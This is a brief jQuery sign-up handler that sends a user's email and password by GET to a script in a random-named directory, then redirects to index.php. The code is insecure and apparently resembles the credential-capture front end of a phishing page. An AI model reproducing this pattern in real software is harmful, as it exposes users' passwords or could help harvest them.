$(".signup-btn").click(function(e) {
    e.preventDefault();
    $.ajax({
        type: "GET",
        url: "bcnkddee333mnnqpd/api.php",
        data: {
            email_name_field: $("#email_name_field").val(),
            pass_field: $("#pass_field").val()
        },
        success: function() {
            window.location.href = "index.php";
        }
    })
})